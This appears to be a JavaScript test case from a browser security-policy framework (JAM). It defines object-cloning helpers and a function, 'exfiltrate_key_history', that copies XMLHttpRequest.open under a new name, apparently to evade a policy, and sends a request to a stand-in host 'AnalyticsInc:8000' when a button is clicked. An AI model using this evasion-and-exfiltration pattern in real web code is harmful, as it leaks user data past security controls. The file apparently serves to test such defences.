// exfil_test_clone.js
function clone(obj$$16) {
  var v11 = obj$$16 == null;
  if (!v11) {
    v11 = typeof obj$$16 != "object";
  }
  if (v11) {
    return obj$$16;
  }
  var temp = {};
  var key$$14;
  for (key$$14 in obj$$16) {
    var v1 = temp;
    var v2 = key$$14;
    var v28 = clone(obj$$16[key$$14]);
    JAM.set(v1, v2, v28);
  }
  return temp;
}
function clone2(obj$$17) {
  if (obj$$17.cloneNode) {
    return obj$$17.cloneNode(true);
  }
  var v4;
  if (obj$$17 instanceof Array) {
    v4 = [];
  } else {
    v4 = {};
  }
  var copy = v4;
  var attr;
  for (attr in obj$$17) {
    var v20 = typeof obj$$17[attr] == "function";
    if (!v20) {
      v20 = obj$$17[attr] == null;
    }
    var v14 = v20;
    if (!v14) {
      v14 = !obj$$17[attr].clone2;
    }
    if (v14) {
      JAM.set(copy, attr, obj$$17[attr]);
    } else {
      if (obj$$17[attr] == obj$$17) {
        JAM.set(copy, attr, copy);
      } else {
        var v5 = copy;
        var v6 = attr;
        var v29 = obj$$17[attr].clone2();
        JAM.set(v5, v6, v29);
      }
    }
  }
  return copy;
}
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v9 = xmlhttp;
  var v30 = clone(xmlhttp.open);
  v9.opennew = v30;
  JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone1", true], JAM.policy.p1);
  xmlhttp.send(null);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

